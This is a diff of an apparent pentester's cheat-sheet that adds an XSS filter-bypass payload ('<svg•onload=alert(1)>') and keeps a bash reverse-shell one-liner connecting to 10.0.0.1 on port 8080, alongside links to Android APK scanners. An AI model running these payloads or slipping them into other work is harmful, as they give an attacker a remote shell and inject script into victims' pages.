@@ -1,6 +1,6 @@
 
-Get Reverse Shell Source: https://twitter.com/Bucio/status/980565480200114176
 ____________________________________________________________________________
+Get Reverse Shell Source: https://twitter.com/Bucio/status/980565480200114176
 
 bash -i >& /dev/tcp/10.0.0.1/8080 0>&1
 
@@ -26,3 +26,11 @@ https://apkscan.nviso.be
 https://www.androlyzer.com
 
 ____________________________________________________________________________
+
+XSS payload without space and slash
+<svg•onload=alert(1)>
+
+____________________________________________________________________________
+
+
+Will be adding more soon!
